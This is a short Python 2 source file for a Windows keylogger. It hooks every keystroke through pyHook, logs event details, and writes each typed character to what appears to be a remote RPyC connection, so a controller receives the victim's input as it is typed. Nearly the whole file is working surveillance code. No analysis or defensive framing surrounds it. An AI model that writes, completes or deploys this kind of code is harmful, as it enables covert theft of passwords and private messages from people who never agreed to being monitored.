import ctypes
import time

class Keylog():
  def OnKeyboardEvent(self,event):
    print 'MessageName:',event.MessageName
    print 'Message:',event.Message
    print 'Time:',event.Time
    print 'Window:',event.Window
    print 'WindowName:',event.WindowName
    print 'Ascii:', event.Ascii, chr(event.Ascii)
    print 'Key:', event.Key
    print 'KeyID:', event.KeyID
    print 'ScanCode:', event.ScanCode
    print 'Extended:', event.Extended
    print 'Injected:', event.Injected
    print 'Transition', event.Transition
    print '---'
    
    #import pdb; pdb.set_trace()
    message = chr(event.Ascii).__str__()

    self.output(message)

    #ctypes.windll.user32.PostQuitMessage(0)
    
    if int(event.Ascii) == 3:
      print 'Time to quit this bitch'
      ctypes.windll.user32.PostQuitMessage(0)
      return False
      
    return True
    
  def output(self,message):

    self.conn.modules.sys.stdout.write(message)
    

    
  def __init__(self,conn):
    
    import pythoncom, pyHook
    self.conn = conn
    hm = pyHook.HookManager()
    hm.KeyDown = self.OnKeyboardEvent
    hm.HookKeyboard()
    conn.modules.sys.stdout.write("Key Logger Started\n")
    

    #pythoncom.PumpMessages()
    
    return 
